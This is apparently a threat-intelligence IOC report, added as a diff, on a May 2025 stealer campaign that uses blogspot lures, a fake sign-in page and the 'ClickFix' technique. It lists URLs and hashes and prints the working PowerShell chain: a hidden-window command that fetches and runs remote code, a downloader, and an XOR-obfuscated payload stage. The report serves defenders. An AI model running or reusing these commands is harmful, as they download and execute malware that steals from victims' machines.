@@ -1,0 +1,102 @@
+Unidentified Stealer | 404 TDS URLs | "book-available" | 12 May 2025
+
+---------------------------------------------------------------
+IOCs
+---------------------------------------------------------------
+URLs (Email):
+https://avegoldenbrhpe.blogspot.com/
+https://blackprinceoxy.blogspot.com/
+https://bridgundefinedbelltbtws.blogspot.com/
+https://desodgucdyy.blogspot.com/
+https://gutsyheartscy.blogspot.com/
+https://hopundefinedevbeag.blogspot.com/
+https://modhopmdoroteaucq.blogspot.com/
+https://powerbladethax.blogspot.com/
+https://russianboypdo.blogspot.com/
+https://stafnigetvpgdm.blogspot.com/
+https://undercloudxatabubkgpwrd.blogspot.com/
+https://upleamrzadrotppv.blogspot.com/
+https://wertyimrproperbyxiwo.blogspot.com/
+
+Landing Page:
+https://book-available.com/sign-in?op_token=REMOVED
+book-available.com
+
+Redirect Example:
+https://jrhornet5k.org/lcc1h?
+
+ClickFix Command:
+https://apioeaesr.icu/fix
+apioeaesr.icu
+
+PowerShell Payload:
+https://apioeaesr.icu/api/images.jpg
+https://apioeaesr.icu/apis/NHPOZHSV/vMQtSMtB
+https://apioeaesr.icu/apic/WsLRLxxz/iFANlbuV
+
+SHA256s:
+b875f244c3029e8b7fcefa4d536a88d8bd8e171573ff4102cfa7e067cd4fafee
+5c02bfe719c33a92eeb98c5e871f109b9b0f47b16b37969149f7e8bf052487aa
+fcd79109d044123efc1cff8b6c408300b1574023087e45109328a95ee1d7744d
+a5061ebc8ab52b9a2a657b3cb5347b3840ae2ed98a8ba3cfc148583b3049d283
+
+---------------------------------------------------------------
+Details
+---------------------------------------------------------------
+
+---- ClickFix Command ----
+powershell -w h -c "$s='xif/uci.rseaeoipa//:sptth';$r=$s[-1..-$s.Length]-join'';iex(iwr $r -UseBasicParsing)""
+
+PowerShell Script (https://apioeaesr.icu/fix):
+Set-ExecutionPolicy Bypass -Scope Process -Force;
+try {
+    $wc = New-Object System.Net.WebClient
+    $domainParts = @('a','p','i','o','e','a','e','s','r','.','i','c','u')
+    $domain = $domainParts -join ''
+    $domain = "https://" + $domain + "/api/images.jpg"
+    $script = $wc.DownloadString($domain)
+    Invoke-Expression $script
+} catch {
+    $domainParts = @('a','p','i','o','e','a','e','s','r','.','i','c','u')
+    $domain = $domainParts -join ''
+    $domain = "https://" + $domain + "/api/images.jpg"
+    $request = [System.Net.HttpWebRequest]::Create($domain)
+    $response = $request.GetResponse()
+    $stream = $response.GetResponseStream()
+    $reader = New-Object System.IO.StreamReader($stream)
+    $script = $reader.ReadToEnd()
+    $reader.Close()
+    $response.Close()
+    Invoke-Expression $script
+}
+
+---- Base64 Decoded PowerShell Script (https://apioeaesr.icu/api/images.jpg) ----
+
+$ErrorActionPreference = 'SilentlyContinue'
+
+$ProgressPreference = 'SilentlyContinue'
+
+$global:WAcwt = '2PxniJ'
+$global:sQGbq = 'FjQXAwgjXAAZHB05Em1YLkFtU3dUSRltHncRSUVtXXdUSQxtHncZSUVtV3dUSRptHncKSUVtHHdUSQBtHncbSUVtR3dRZE0uXT0ZBwdqD3BcCgYnUzkWPgg4RiNYQwMlWz5YSU5AFj8aCDw4XhQUAkl3EnIQGh06QWpXQUtqGXBcCgYnUzkWTkJqEH8ZHgA5HR4wPiYQegMuQR8HYyQrIx0IEFpcAQssZyIUKxEvEm1YTAE+RiALVEZlEHBTTk0uXT0ZBwdqGXBaQQg6WzNXORoGYBwAFhNlWxY5IAUoRwZaZE0rQDcNAwwkRiNYU0loAigZWFF9BmVNWEtARiIBThJAEnBYTk0uXjw6Fx0vQXBFTkEDXCYXBQxnZTUaPAw7RzULGklnZyIRTk0lUDYtHAUOXjxYQzw5VxIZHQApYjEKHQAkVXlWLQYkRjUWGmNqEnBYSgwyVxIBGgw5Em1YRiAkRD8TC0QdVzIqCxg/VyMMTkQfQDlYSgYoVAUKAiwyV3BVOxovcDELBwoaUyILBwctG347AQc+Vz4MZElqEnAjPAwsXjUbGgAlXH45HRovXzIUFzRwCBwXDw1iFjQUAiszRjULR0k2Eh8NGkQERzwUZElqEnAjIQssYTUbOgYlXn4rCwoeXT8UM1Nwcz4ZAhA5WyNQSgwyVxIBGgw5HnBcDxstRz0dAB05G1oFTgorRjMQThJAEnBYTh04S3ADZElqEnBYTklqFicdDComWzUWGkl3Eh4dGUQFUDodDR1qYSkLGgwnHB4dGkcdVzI7AgAvXCRyTklqEnBYTkluVjwULBA+VyNYU0luRTUaLQUjVz4MQC0lRT4UAQgudjEMD0FuXTIeOxsmdjwUR2NqEnBYTklqEnQdFgwISyQdHUl3EnQPCwsJXjkdAB1kdj8PAAUlUzQ8Dx0rGnQXDA8fQDw9FgxjOHBYTklqEnBYNTsvVDwdDR0jXT5WLxo5Vz0aAhAXCGo0AQguGnQcAgUISyQdHUBqTnA3Gx1nfCUUAmNqEnBYTklqEgs3DA8ZVzMsAQYmHAMdDT0lXTwlVFMLXDEUFxojQXhcCxEvcCkMCxpmEnQZHA4/XzUWGhpjOHBYTkk3EjMZGgoiEityTklqEnBYTklpEhEcCkk4VyQKF0knVzMQDwcjQT1YGQA+WnAcCwUrS1pYTklqEnBYTjo+UyIMQzomVzUITkQZVzMXAA05EmJyTklqEnBYTkluRTUaLQUjVz4MTlRqfDUPQyYoWDUbGkkZSyMMCwRkfDUMQD4vUBMUBwwkRlpYTklqEnBYTk0uXjw6Fx0vQXBFTk09VzI7AgAvXCRWKgY9XDwXDw0OUyQZRk0lUDYtHAUOXjxRZElqEnBYTklqFjUACyszRjULTlRqFicdDComWzUWGkcOXScWAgYrVhQZGghiFj8aCDw4XhUAC0BAEnBYTklqEnAjPAwsXjUbGgAlXH45HRovXzIUFzRwCBwXDw1iFjQUAiszRjULR0k2Eh8NGkQERzwUZElqEnBYTklqaR8aCDovUQQXAQVkYTUbOgYlXg1CVCgkUzwBHQA5GnQdFgwISyQdHUVqFjEKCRwnVz4MHUBAEnBYThRATw=='
+$global:OcZms = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($global:sQGbq))
+$global:UssZj = ''
+
+for ($i = 0; $i -lt $global:OcZms.Length; $i++) {
+    $keyChar = $global:WAcwt[$i % $global:WAcwt.Length]
+    $encChar = $global:OcZms[$i]
+    $global:UssZj += [char]([int][char]$encChar -bxor [int][char]$keyChar)
+}
+
+try { Invoke-Expression $global:UssZj } catch { & ([ScriptBlock]::Create($global:UssZj)) }
+
+---- Creates TAsk "BabaiMazai" ----
+
+---- Creates Mutex "KolokolBozhii"----
+NtCreateMutant	MutexName: KolokolBozhii
+
+
+---------------------------------------------------------------
+Samples
+---------------------------------------------------------------
+
+1. https://tria.ge/250512-taaetstyaz/behavioral1
